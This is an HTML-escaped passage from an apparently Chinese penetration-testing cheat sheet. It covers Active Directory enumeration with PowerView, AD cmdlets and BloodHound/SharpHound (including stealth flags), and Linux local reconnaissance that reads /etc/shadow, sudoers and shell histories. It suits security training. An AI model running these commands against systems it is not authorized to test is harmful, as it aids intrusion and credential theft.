class=\&quot;line\&quot;&gt;&lt;span&gt;查看域内机器以administrator权限运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-processhunter }\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/306.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或指定参数userfile和computerfile查询某台机器某个用户的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-processhunter -Userfile .\\user.txt -computerfile .\\host.txt}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/307.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询域内机器共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Invoke-sharefinder}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/308.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询域内机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -Domain zone.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/309.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/310.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dev-powerview&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控机器和win版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-DomainController |select name,osversion|fl &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举其他域： Get-NetDomain -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域 SID： Get-DomainSID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域策略：Get-DomainPolicy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控制器：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainController&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainController -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域用户：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser -SamAccountName &amp;#x3C;user &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser | select cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;检查上次修改密码&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-UserProperty -Properties pwdlastset&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -FullData&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-DomainGroup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举存活主机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -Ping&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举组策略：Get-NetGPO&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;显示某台机器的活动策略&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetGPO -ComputerName &amp;#x3C;Name of the PC&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举 OU：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetOU -FullData &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetGPO -GPOname &amp;#x3C;The GUID of the GPO&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainTrust&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainTrust -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找当前域中当前用户具有本地管理员访问权限的所有计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Find-LocalAdminAccess -Verbose&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;在域的所有机器上查找本地管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-EnumerateLocalAdmin -Verbose&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;全部使用技巧&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;操作系统&amp;#x26;内核版本&amp;#x26;环境变量&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/issue&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/lsb-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/redhat-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /proc/version&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -mrs&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;rpm -q kernel&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dmesg | grep Linux&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls /boot | grep vmlinuz-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/profile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/bashrc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_profile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bashrc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_logout&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;env&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Root权限进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ps aux | grep root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ps -ef | grep root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;计划任务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;crontab -l&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -alh /var/spool/cron&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /etc/ | grep cron&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/at.allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/at.deny&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron.allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron.deny&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/anacrontab&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /var/spool/cron/crontabs/root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;IP信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/sbin/ifconfig -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/network/interfaces&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/sysconfig/network&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;连接信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;grep 80 /etc/services&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antpx&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -tulpn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chkconfig --list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chkconfig --list | grep 3:on&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;last&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;w&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;用户信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;id&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whomi&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;w&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;last&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/passwd&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/group&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/shadow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -alh /var/mail/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;grep -v -E \&quot;^#\&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # 列出超级用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;awk -F: &#39;($3 == \&quot;0\&quot;) {print}&#39; /etc/passwd   #列出超级用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/sudoers&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo –l&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;操作记录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.nano_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.atftp_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.mysql_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.php_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -writable -type d 2/dev/null      # 可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -222 -type d 2/dev/null     # 可写目录 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -o w -type d 2/dev/null     # 可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -o x -type d 2/dev/null     # 可执行目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null   # 可写可执行目录&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;addomain\&quot;&gt;ADDomain&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#addomain\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取当前域： Get-ADDomain&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举其他域： Get-ADDomain -Identity &amp;#x3C;Domain&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域 SID： Get-DomainSID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控制器：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADDomainController&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADDomainController -Identity &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域用户：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADUser -Filter * -Identity &amp;#x3C;user -Properties *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域计算机：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADComputer -Filter * -Properties *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADGroup -Filter * &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADTrust -Filter *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADTrust -Identity &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域林信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADForest&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADForest -Identity &amp;#x3C;ForestName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举本地 AppLocker 有效策略：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;bloodhoundad\&quot;&gt;BloodHoundAD&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#bloodhoundad\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;AzureHound&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;. .\\AzureHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-AzureHound&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;BloodHound&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all -d active.htb --searchforest&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集不包括GPOLocalGroup的信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all,GPOLocalGroup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;只从DC手机信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe --CollectionMethod DCOnly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all --LdapUsername &amp;#x3C;UserName --LdapPassword &amp;#x3C;Password --JSONFolder &amp;#x3C;PathToFile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all --LdapUsername &amp;#x3C;UserName --LdapPassword &amp;#x3C;Password --domaincontroller 10.10.10.100 -d active.htb&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或使用powershell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-BloodHound -CollectionMethod All  -LDAPUser &amp;#x3C;UserName -LDAPPass &amp;#x3C;Password -OutputDirectory &amp;#x3C;PathToFile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或远程使用BloodHound Python&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/fox-it/BloodHound.py&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pip install bloodhound&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用 Certipy 收集更多用于证书利用的数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;certipy find &#39;corp.local/john:Passw0rd@dc.corp.local&#39; -bloodhound&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;然后将 zip/json 文件导入 Neo4J 数据库并进行查询。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;apt install bloodhound &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;启动BloodHound和数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;neo4j console&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或者使用docker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./bloodhound --no-sandbox&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;访问http://127.0.0.1:7474  user:neo4J, 